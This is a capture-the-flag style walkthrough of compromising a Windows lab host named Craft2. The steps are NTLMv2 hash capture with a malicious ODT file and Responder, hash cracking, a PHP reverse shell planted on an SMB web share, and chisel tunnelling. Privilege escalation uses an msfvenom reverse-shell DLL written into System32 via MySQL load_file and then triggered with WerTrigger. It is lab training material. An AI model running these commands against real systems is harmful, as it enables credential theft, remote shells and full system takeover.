---
icon: windows
---

# Craft2 - Hard

## <mark style="color:blue;">Gaining Access</mark>

Nmap scan:

```
# Nmap TCP
nmap -A -T4 -p- -Pn 192.168.161.188 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-01 15:02 EDT
Nmap scan report for 192.168.161.188
Host is up (0.032s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
|_http-title: Craft
135/tcp   open  msrpc         Microsoft Windows RPC
445/tcp   open  microsoft-ds?
49666/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (92%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
Aggressive OS guesses: Windows Server 2019 (92%), Microsoft Windows 10 1903 - 21H1 (85%), Microsoft Windows 10 1607 (85%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 4 hops
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2025-10-01T19:05:04
|_  start_date: N/A

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   34.43 ms 192.168.45.1
2   29.36 ms 192.168.45.254
3   29.73 ms 192.168.251.1
4   32.83 ms 192.168.161.188
```

Craft2 seems to have a couple of more open ports compare to Craft. However anonymous access is not available to us, which means we will probably need to leverage some credentials and check what is inside.

### <mark style="color:$primary;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (954).png" alt=""><figcaption></figcaption></figure>

So this seems to be the same website, when trying to upload a malicious .odt file this time it seems they were prepared:

<figure><img src="../../.gitbook/assets/image (955).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Capturing NTMLv2 Creds with malicious ODT file</mark>

I had to find another way of leaking NTLMv2 creds. And this is what i found

<figure><img src="../../.gitbook/assets/image (956).png" alt=""><figcaption></figcaption></figure>

I am going to download it

```
searchsploit -m 44564
```

<figure><img src="../../.gitbook/assets/image (959).png" alt=""><figcaption></figcaption></figure>

The script generates the <mark style="color:$info;">**bad.odt**</mark> file. I am going to start responder and upload the file, let's see if it works!

```
sudo responder -I tun0
```

<figure><img src="../../.gitbook/assets/image (958).png" alt=""><figcaption></figcaption></figure>

Now we will wait for the user to access it.

<figure><img src="../../.gitbook/assets/image (960).png" alt=""><figcaption></figcaption></figure>

It's the same user from last time! I am going to save the hash to a file and try to crack it

### <mark style="color:$primary;">Cracking NTLMv2 Hash</mark>

```
john thecybergeek.hash -w=/usr/share/wordlists/rockyou.txt
```

<figure><img src="../../.gitbook/assets/image (961).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (962).png" alt=""><figcaption></figcaption></figure>

We have read and write on WebApp share, maybe we can upload a webshell!

### <mark style="color:$primary;">PHP Upload RCE</mark>

```
smbclient \\\\192.168.161.188\\WebApp -U 'thecybergeek%winniethepooh'
```

<figure><img src="../../.gitbook/assets/image (963).png" alt=""><figcaption></figcaption></figure>

This contains the pages for the website on port 80, I am not going to upload a webshell anymore I'll upload a php reverse shell and see if I can access it. I'll use [https://www.revshells.com/](https://www.revshells.com/) to create it&#x20;

<figure><img src="../../.gitbook/assets/image (964).png" alt=""><figcaption></figcaption></figure>

Save it to a file and place it in the WebApp share.

<figure><img src="../../.gitbook/assets/image (965).png" alt=""><figcaption></figcaption></figure>

Now make sure you have a listener ready before trying to accessing it.

<figure><img src="../../.gitbook/assets/image (966).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (967).png" alt=""><figcaption></figcaption></figure>

It worked!

## <mark style="color:blue;">Privilege Escalation</mark>

<figure><img src="../../.gitbook/assets/image (968).png" alt=""><figcaption></figcaption></figure>

Apache's privileges suck compared to last time :rofl:. They seem to have fixed all the issues from the original Craft

<figure><img src="../../.gitbook/assets/image (970).png" alt=""><figcaption></figcaption></figure>

I came across default credentials for MySQL database.&#x20;

<figure><img src="../../.gitbook/assets/image (969).png" alt=""><figcaption></figcaption></figure>

Mysql is running! Let's check it out:

<figure><img src="../../.gitbook/assets/image (971).png" alt=""><figcaption></figcaption></figure>

Where going to have to do port forwarding to check it out! Either I found something or I am just diving into a rabbit hole

I am going to use chisel for portforwarding:

### <mark style="color:$primary;">Portforwarding 3306</mark>

```
./chisel_1.10.1_linux_amd64 server -p 445 --reverse
```

<figure><img src="../../.gitbook/assets/image (972).png" alt=""><figcaption></figcaption></figure>

now to download the chisel on the target machine and have it forward port 3306

```
iwr -uri http://192.168.45.158/chisel_1.10.1_windows_amd64 -outfile chisel_1.10.1_windows_amd64.exe
```

<figure><img src="../../.gitbook/assets/image (974).png" alt=""><figcaption></figcaption></figure>

```
.\chisel_1.10.1_windows_amd64.exe client 192.168.45.158:445 R:3306:localhost:3306
```

<figure><img src="../../.gitbook/assets/image (975).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:$primary;">Enumerating MySQL Database</mark>

```
mysql -h 127.0.0.1 -uroot --skip-ssl
```

<figure><img src="../../.gitbook/assets/image (977).png" alt=""><figcaption></figcaption></figure>

There is nothing here!

Hold on!

<figure><img src="../../.gitbook/assets/image (978).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (980).png" alt=""><figcaption></figcaption></figure>

We have all privileges enabled on the machine via mysql!

I cannot use the exec command however I can use select <mark style="color:$info;">**load\_file**</mark>

<figure><img src="../../.gitbook/assets/image (979).png" alt=""><figcaption></figcaption></figure>

If I can use <mark style="color:$info;">**load\_file**</mark>, this means I can upload a reverse binary and replace it with another file.

I'll use the [**WerTrigger**](https://github.com/sailay1996/WerTrigger) exploit, about this exploit: "Weaponizing for privileged file writes bugs with windows problem reporting"

First I will create the phoneinfo.dll

```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.158 LPORT=443 -f dll -o phoneinfo.dll
```

Second I will need to download the [**WerTrigger**](https://github.com/sailay1996/WerTrigger) exploit files  and the phoneinfo.dll we created on the system:

<figure><img src="../../.gitbook/assets/image (984).png" alt=""><figcaption></figcaption></figure>

Third using the privileged MySQL instance, I need to place <mark style="color:$info;">**phoneinfo.dll**</mark> file into <mark style="color:$info;">**C:\Windows\System32**</mark>

```
select load_file('C:\Users\apache\AppData\Local\Temp\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
```

<figure><img src="../../.gitbook/assets/image (982).png" alt=""><figcaption></figcaption></figure>

For the final step make sure you have a listener ready on your desired port:

Execute <mark style="color:$info;">**WerTrigger.exe**</mark> and you will get a shell as administrator!
